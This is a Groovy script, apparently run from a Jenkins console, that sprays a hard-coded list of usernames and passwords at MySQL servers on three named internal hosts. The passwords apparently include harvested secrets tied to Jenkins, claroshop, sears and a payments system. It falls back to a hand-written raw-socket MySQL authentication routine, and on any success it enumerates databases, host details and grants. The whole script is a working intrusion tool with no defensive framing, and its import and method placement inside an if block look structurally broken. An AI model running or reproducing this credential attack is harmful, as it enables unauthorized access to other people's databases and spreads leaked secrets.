println "=== MYSQL AUTH ATTEMPTS ==="

def tryJDBC(String host, int port, String user, String pass) {
    def url = "jdbc:mysql://${host}:${port}/?connectTimeout=5000&socketTimeout=5000&useSSL=false"
    try {
        def conn = java.sql.DriverManager.getConnection(url, user, pass)
        println "  [+] SUCCESS: ${user}@${host}:${port}"
        
        // If connected, enumerate databases
        def stmt = conn.createStatement()
        def rs = stmt.executeQuery("SHOW DATABASES")
        def dbs = []
        while (rs.next()) { dbs << rs.getString(1) }
        println "      DATABASES: ${dbs.join(', ')}"
        
        // Get current user and host
        rs = stmt.executeQuery("SELECT CURRENT_USER(), @@hostname, @@version")
        if (rs.next()) {
            println "      USER: ${rs.getString(1)}"
            println "      HOSTNAME: ${rs.getString(2)}"
            println "      VERSION: ${rs.getString(3)}"
        }
        
        // Check privileges
        rs = stmt.executeQuery("SHOW GRANTS")
        while (rs.next()) { println "      GRANT: ${rs.getString(1)}" }
        
        conn.close()
        return true
    } catch (Exception e) {
        def msg = e.message ?: e.toString()
        if (msg.contains("Access denied")) {
            println "  [-] DENIED: ${user}@${host}:${port} (${msg.take(80)})"
        } else if (msg.contains("Communications link failure") || msg.contains("driver")) {
            println "  [!] DRIVER/CONN: ${user}@${host}:${port} (${msg.take(100)})"
        } else {
            println "  [!] ERROR: ${user}@${host}:${port} (${msg.take(100)})"
        }
        return false
    }
}

// Try to load JDBC driver
def driverLoaded = false
try {
    Class.forName("com.mysql.jdbc.Driver")
    driverLoaded = true
    println "MySQL JDBC Driver: com.mysql.jdbc.Driver LOADED"
} catch (Exception e) {
    try {
        Class.forName("com.mysql.cj.jdbc.Driver")
        driverLoaded = true
        println "MySQL JDBC Driver: com.mysql.cj.jdbc.Driver LOADED"
    } catch (Exception e2) {
        try {
            Class.forName("org.mariadb.jdbc.Driver")
            driverLoaded = true
            println "MariaDB JDBC Driver LOADED"
        } catch (Exception e3) {
            println "NO MySQL/MariaDB JDBC Driver found!"
            
            // List available JDBC drivers
            def drivers = java.sql.DriverManager.getDrivers()
            println "Available JDBC drivers:"
            while (drivers.hasMoreElements()) {
                println "  ${drivers.nextElement().class.name}"
            }
        }
    }
}

if (!driverLoaded) {
    println "\nFalling back to raw socket MySQL auth test..."
    
    // Raw MySQL protocol auth test
    import java.security.MessageDigest
    
    def mysqlAuth(String host, int port, String user, String pass) {
        try {
            def s = new Socket()
            s.connect(new java.net.InetSocketAddress(host, port), 5000)
            s.setSoTimeout(5000)
            def is = s.getInputStream()
            def os = s.getOutputStream()
            
            // Read greeting packet
            def lenBuf = new byte[4]
            is.read(lenBuf, 0, 4)
            def pktLen = (lenBuf[0] & 0xFF) | ((lenBuf[1] & 0xFF) << 8) | ((lenBuf[2] & 0xFF) << 16)
            def seqId = lenBuf[3] & 0xFF
            
            def greeting = new byte[pktLen]
            def totalRead = 0
            while (totalRead < pktLen) {
                def r = is.read(greeting, totalRead, pktLen - totalRead)
                if (r < 0) break
                totalRead += r
            }
            
            // Parse greeting
            def protoVer = greeting[0] & 0xFF
            def versionEnd = 0
            for (int i = 1; i < greeting.length; i++) {
                if (greeting[i] == 0) { versionEnd = i; break }
            }
            def version = new String(greeting, 1, versionEnd - 1)
            
            // Extract salt (challenge)
            def threadId = (greeting[versionEnd+1] & 0xFF) | ((greeting[versionEnd+2] & 0xFF) << 8) |
                          ((greeting[versionEnd+3] & 0xFF) << 16) | ((greeting[versionEnd+4] & 0xFF) << 24)
            def salt1 = new byte[8]
            System.arraycopy(greeting, versionEnd+5, salt1, 0, 8)
            // filler + capabilities + charset + status + capabilities2 + auth_len + reserved
            def salt2Start = versionEnd + 5 + 8 + 1 + 2 + 1 + 2 + 2 + 1 + 10
            def salt2 = new byte[12]
            if (salt2Start + 12 <= greeting.length) {
                System.arraycopy(greeting, salt2Start, salt2, 0, 12)
            }
            
            // Combine salt
            def fullSalt = new byte[20]
            System.arraycopy(salt1, 0, fullSalt, 0, 8)
            System.arraycopy(salt2, 0, fullSalt, 8, 12)
            
            // Compute mysql_native_password hash
            def md = MessageDigest.getInstance("SHA-1")
            def passHash1 = md.digest(pass.getBytes("UTF-8"))
            md.reset()
            def passHash2 = md.digest(passHash1)
            md.reset()
            md.update(fullSalt)
            md.update(passHash2)
            def scramble = md.digest()
            def authData = new byte[20]
            for (int i = 0; i < 20; i++) {
                authData[i] = (byte)(passHash1[i] ^ scramble[i])
            }
            
            // Build HandshakeResponse41
            def userBytes = user.getBytes("UTF-8")
            def pktPayload = new ByteArrayOutputStream()
            // Client capabilities (basic)
            def clientCaps = 0x000FA68D // CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION | etc
            pktPayload.write((clientCaps & 0xFF) as int)
            pktPayload.write(((clientCaps >> 8) & 0xFF) as int)
            pktPayload.write(((clientCaps >> 16) & 0xFF) as int)
            pktPayload.write(((clientCaps >> 24) & 0xFF) as int)
            // Max packet size
            pktPayload.write([0x00, 0x00, 0x00, 0x01] as byte[])
            // Charset (utf8 = 33)
            pktPayload.write(33)
            // Reserved 23 zeros
            pktPayload.write(new byte[23])
            // Username
            pktPayload.write(userBytes)
            pktPayload.write(0)
            // Auth data length + data
            pktPayload.write(20)
            pktPayload.write(authData)
            // No database
            
            def payload = pktPayload.toByteArray()
            def authPkt = new byte[4 + payload.length]
            authPkt[0] = (byte)(payload.length & 0xFF)
            authPkt[1] = (byte)((payload.length >> 8) & 0xFF)
            authPkt[2] = (byte)((payload.length >> 16) & 0xFF)
            authPkt[3] = (byte)1 // sequence id
            System.arraycopy(payload, 0, authPkt, 4, payload.length)
            
            os.write(authPkt)
            os.flush()
            
            // Read response
            is.read(lenBuf, 0, 4)
            def respLen = (lenBuf[0] & 0xFF) | ((lenBuf[1] & 0xFF) << 8) | ((lenBuf[2] & 0xFF) << 16)
            def resp = new byte[respLen]
            totalRead = 0
            while (totalRead < respLen) {
                def r = is.read(resp, totalRead, respLen - totalRead)
                if (r < 0) break
                totalRead += r
            }
            
            def respType = resp[0] & 0xFF
            s.close()
            
            if (respType == 0x00) {
                return "SUCCESS"
            } else if (respType == 0xFF) {
                def errCode = (resp[1] & 0xFF) | ((resp[2] & 0xFF) << 8)
                def errMsg = new String(resp, 9, resp.length - 9, "UTF-8")
                return "DENIED (${errCode}: ${errMsg})"
            } else {
                return "UNKNOWN_RESP_${respType}"
            }
        } catch (Exception e) {
            return "ERROR: ${e.class.simpleName}: ${e.message}"
        }
    }
    
    def targets = [
        [host: "172.27.141.4", port: 3306, desc: "T1Pagos"],
        [host: "172.27.141.6", port: 3306, desc: "Unknown"],
        [host: "172.27.140.151", port: 3306, desc: "Redis host"],
    ]
    
    def creds = [
        ["root", ""],
        ["root", "@st0rAg3K3Y"],
        ["root", "nBZxDxL2XxYwAEYyttme"],
        ["root", "root"],
        ["root", "JenkisLegasy25"],
        ["root", "e6LBqIkOI\$PR1XX2oia"],
        ["root", "dtvV50vwfGq5CO9"],
        ["admin", "admin"],
        ["admin", "@st0rAg3K3Y"],
        ["claroshop", "claroshop"],
        ["claroshop", "@st0rAg3K3Y"],
        ["sears", "sears"],
        ["t1pagos", "t1pagos"],
        ["jenkins", "JenkisLegasy25"],
        ["jenkins", "e6LBqIkOI\$PR1XX2oia"],
    ]
    
    targets.each { t ->
        println "\n--- ${t.desc} (${t.host}:${t.port}) ---"
        creds.each { c ->
            def result = mysqlAuth(t.host, t.port, c[0], c[1])
            def marker = result.startsWith("SUCCESS") ? "[+]" : result.startsWith("DENIED") ? "[-]" : "[!]"
            println "  ${marker} ${c[0]}:${c[1].take(20)} => ${result}"
            if (result.startsWith("SUCCESS")) {
                println "  *** VALID CREDENTIALS FOUND! ***"
            }
        }
    }
}

println "\n=== MYSQL AUTH DONE ==="
